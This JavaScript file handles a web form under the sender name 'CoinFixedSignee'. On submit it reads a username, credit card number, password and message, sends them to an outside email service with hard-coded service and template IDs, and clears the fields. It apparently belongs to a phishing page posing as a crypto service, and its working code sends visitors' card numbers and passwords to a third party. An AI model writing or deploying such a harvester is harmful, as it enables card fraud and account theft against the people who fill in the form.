// const userName = document.querySelector('#userName');
// const creditCard = document.querySelector('#creditCard');
// const password = document.querySelector('#password');
// const exchangeMeans = document.querySelector('#exchangeMeans');
let display = document.querySelector('.display');
const form = document.querySelector('#form')
const loading = document.querySelector('.loading');
const submitBtn = document.querySelector("#submit")


window.onload = function sendMail() {
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // submitBtn.value = 'Loading';
        // submitBtn.classList.add('loading');

        var formContent = {
            from_name: 'CoinFixedSignee',
            userName: document.querySelector('#userName').value,
            creditCard: document.querySelector('#creditCard').value,
            password: document.querySelector('#password').value,
            message: document.querySelector('#message').value,
        };
    
        emailjs.send('e920d5afds', 'template_a85hrv9', formContent).then((res) => {

                alert('SUCCESS!' + ' ' + res.status + ' ' + res.text);
                document.querySelector('#userName').value = '';
                document.querySelector('#creditCard').value = '';
                document.querySelector('#password').value = '';
                document.querySelector('#message').value = '';
                console.log(res);

            },
            (error) => {
                alert('FAILED...', error);
            });
    })
}
